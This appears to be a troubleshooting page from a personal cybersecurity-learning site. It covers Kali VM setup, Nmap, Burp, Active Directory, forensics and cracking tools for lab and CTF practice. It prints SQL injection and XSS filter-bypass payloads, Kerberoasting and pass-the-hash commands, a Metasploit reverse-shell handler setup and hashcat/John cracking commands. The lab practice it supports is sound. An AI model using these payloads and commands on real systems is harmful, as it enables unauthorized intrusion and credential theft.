VM / SETUP

⚠ Kali Linux VM is extremely slow or laggy MEDIUM ▼

Common causes: Not enough RAM/CPU allocated, no 3D acceleration, host machine under load, or running on HDD instead of SSD.

[01]Allocate at least 4 GB RAM and 2 CPU cores in VM settings.
[02]Enable VT-x / AMD-V in your BIOS and in VM settings.
[03]In VirtualBox: Settings → Display → Enable 3D Acceleration, increase Video Memory to 128 MB.
[04]Move the VM disk (.vmdk / .vdi) to an SSD if possible.
[05]Install guest additions: sudo apt install virtualbox-guest-additions-iso
⚠ VM won't boot after a failed snapshot restore HIGH ▼

Prevention is key: Always take a clean snapshot before starting a lab, and another before any risky operations.

[01]Try restoring to an earlier snapshot from the snapshot manager.
[02]If the VM hangs at boot: hold Shift during boot to enter GRUB, select advanced options, and boot into recovery mode.
[03]In recovery mode run: fsck -y /dev/sda1 to check/repair the filesystem.
[04]If all else fails, re-download a fresh Kali VM from kali.org/get-kali and restore your files from backup.
ℹ Copy/paste between host and VM not working LOW ▼
[01]VirtualBox: Devices → Shared Clipboard → Bidirectional. Also enable Drag and Drop.
[02]Install/reinstall Guest Additions: Devices → Insert Guest Additions CD image → run installer inside VM.
[03]VMware: VM → Settings → Options → Guest Isolation → Enable copy/paste.
[04]Restart the VM after making changes.

NETWORK ISSUES

⚠ Nmap returns "Host seems down" or "No route to host" MEDIUM ▼

This usually means the target is unreachable, firewalled, or host discovery is being blocked by ICMP filtering.

[01]Add -Pn to skip host discovery: nmap -Pn <target>
[02]Check VM network mode — for lab targets, both VMs should be on the same host-only or NAT network.
[03]Verify with ping: ping <target-ip>. If ping fails, fix routing first.
[04]Check IP assignment: ip a on both machines and confirm they're in the same subnet.
nmap -sn 192.168.56.0/24 # Ping sweep the subnet nmap -Pn -sV -p- 192.168.56.10 # Full scan ignoring ping
⚠ Wireshark shows no interfaces or can't capture MEDIUM ▼
[01]Run Wireshark as root (not ideal) or add your user to the wireshark group:
sudo usermod -aG wireshark $USER sudo dpkg-reconfigure wireshark-common # Select "Yes" when prompted newgrp wireshark
[02]Log out and back in for group changes to take effect.
[03]If running in a VM, ensure the network adapter is set to Promiscuous Mode: Allow All in VM settings.

WEB SECURITY

⚠ Burp Suite not intercepting traffic / browser ignoring proxy MEDIUM ▼
[01]Confirm Burp proxy listener is on 127.0.0.1:8080 (Proxy → Options → Proxy Listeners).
[02]In Firefox: Preferences → Network Settings → Manual Proxy → HTTP Proxy: 127.0.0.1, Port: 8080. Check "Use for all protocols."
[03]For HTTPS: visit http://burp in the browser, download the CA cert, then import it into Firefox (Preferences → Certificates → Import).
[04]Confirm "Intercept is on" toggle in Burp's Proxy tab.
[05]Use FoxyProxy extension in Firefox for easier proxy toggling.
ℹ SQL injection payloads not triggering / WAF blocking LOW ▼

Techniques to bypass filtering:

' OR 1=1-- # Basic check (blocked often) ' OR 1=1-- - # Add trailing space/dash '/**/OR/**/1=1-- # Comment-based space bypass ' OR 'a'='a # Alternative true condition %27 OR 1=1-- # URL-encoded quote 1'; WAITFOR DELAY '0:0:5'-- # Time-based blind (MSSQL)
[01]Use sqlmap with tamper scripts: sqlmap -u "URL" --tamper=space2comment
[02]Try different comment styles: --, #, /**/
[03]Check for second-order injection (input stored, executed later).
ℹ XSS payloads being filtered or not executing LOW ▼
<script>alert(1)</script> # Basic (usually filtered) <img src=x onerror=alert(1)> # Event handler bypass <svg onload=alert(1)> # SVG vector <details open ontoggle=alert(1)> # Toggle event javascript:alert(1) # In href attributes <ScRiPt>alert(1)</ScRiPt> # Case variation
[01]Identify the injection context first: HTML body, attribute, JS string, or URL parameter.
[02]Use XSS Hunter or Burp Collaborator to detect blind XSS.

ACTIVE DIRECTORY

⚠ Kerberoasting returns no SPNs or "KDC_ERR" errors MEDIUM ▼
[01]Ensure you have valid domain credentials before attempting Kerberoasting.
[02]Enumerate SPNs first: GetUserSPNs.py domain/user:pass -dc-ip <DC>
[03]If clock skew error appears: sync time with DC: sudo ntpdate <DC-IP> or use -no-pass -k with a valid Kerberos ticket.
impacket-GetUserSPNs domain.local/user:pass \ -dc-ip 10.10.10.10 -request \ -outputfile hashes.kerberoast hashcat -m 13100 hashes.kerberoast wordlist.txt
⚠ Pass-the-Hash / psexec returns "Access Denied" HIGH ▼
[01]Confirm you have the correct NTLM hash format: LM:NT (e.g., aad3b435b51404eeaad3b435b51404ee:<nthash>).
[02]The target account must be a local administrator on the remote machine, not just a domain admin.
[03]Check if LocalAccountTokenFilterPolicy is restricting remote admin access.
[04]Try alternative tools: wmiexec.py, smbexec.py, evil-winrm.
impacket-wmiexec domain/admin@target -hashes :<nthash> evil-winrm -i target -u admin -H <nthash>

DIGITAL FORENSICS

⚠ Volatility 2 "No suitable address space" or wrong profile MEDIUM ▼
[01]Identify the correct profile first: vol.py -f memory.raw imageinfo
[02]If imageinfo fails, try kdbgscan: vol.py -f memory.raw kdbgscan
[03]For Volatility 3, profiles are auto-detected — prefer Vol3 for modern images:
vol.py -f memory.raw windows.pslist.PsList vol.py -f memory.raw windows.netscan.NetScan vol.py -f memory.raw windows.cmdline.CmdLine
[04]Ensure you're using the correct Volatility version (2 vs 3) — syntax differs significantly.
ℹ Autopsy running extremely slow during analysis LOW ▼
[01]In Autopsy Case settings, disable unnecessary ingest modules (e.g., photo analyzer, keyword search if not needed).
[02]Allocate more RAM to Autopsy: Edit → Options → Application → set JVM heap to 70% of available RAM.
[03]Store disk images on SSD, not HDD. Autopsy performance heavily depends on I/O speed.
[04]For quick artifact extraction, consider FTK Imager or command-line tools (strings, grep) instead.

TOOL ISSUES

⚠ Metasploit multi/handler not catching reverse shell HIGH ▼
[01]Confirm LHOST is set to your tun0 (VPN) IP, not localhost or a VM NAT IP.
[02]Confirm LPORT matches exactly what the payload was generated with.
[03]Ensure the handler payload type matches the exploit payload (e.g., both windows/x64/meterpreter/reverse_tcp).
use multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST tun0 # or your VPN IP set LPORT 4444 set ExitOnSession false run -j # Run as background job
[04]Test with a netcat listener first: nc -lvnp 4444 to rule out connectivity issues.
ℹ Hashcat cracking too slow or not utilizing GPU LOW ▼
[01]Run hashcat on your host machine (not inside a VM) — VMs cannot access the GPU.
[02]Install CUDA (NVIDIA) or ROCm (AMD) drivers on the host.
[03]Use --benchmark to test speed: hashcat -m 1000 --benchmark
[04]Use rules with rockyou to maximize coverage:
hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule hashcat -m 1000 hash.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule
[05]For lab hashes (CTF/HTB), try CrackStation online first — it's instant for common hashes.
ℹ John the Ripper: "No password hashes loaded" or wrong format LOW ▼
[01]Identify the hash format first using hashid or hash-identifier: hash-identifier <hash>
[02]Specify format explicitly: john hash.txt --format=NT --wordlist=rockyou.txt
[03]For /etc/shadow files, use unshadow first: unshadow passwd shadow > combined.txt
john --list=formats | grep -i ntlm # List available formats john hash.txt --format=raw-md5 --wordlist=rockyou.txt john hash.txt --show # Show cracked passwords

THIS SITE

⚠ GitHub Pages site shows 404 or won't deploy HIGH ▼
[01]Ensure your repo is named exactly yourusername.github.io (all lowercase).
[02]Go to Settings → Pages → confirm Source is set to Deploy from branch → main → / (root).
[03]Check the Actions tab in GitHub for deployment errors.
[04]Ensure index.html exists in the root of your repo (not inside a subfolder).
[05]Wait up to 10 minutes after first deployment. Subsequent pushes update in ~30 seconds.
⚠ My tracker data is missing or was reset HIGH ▼

This site uses browser localStorage to store your data. It is browser- and device-specific. Your data can be lost if:

[01]You cleared browser cache/history (localStorage is wiped with "Clear site data").
[02]You're using a different browser or device — data does not sync between them.
[03]You opened the site in Private/Incognito mode (data resets each session).

Backup tip: Open your browser's DevTools (F12) → Application → Local Storage → copy the hunterEntries value and save it in a text file as a backup.

ℹ Site looks broken — missing styles or fonts MEDIUM ▼
[01]Ensure styles.css is in the same folder as all HTML files in your GitHub repo.
[02]Google Fonts require an internet connection to load. The site may look different offline — this is expected.
[03]Check the browser console (F12 → Console) for 404 errors on CSS or font files.
[04]Confirm all 5 files are committed: index.html, tracker.html, rank.html, troubleshooting.html, styles.css.
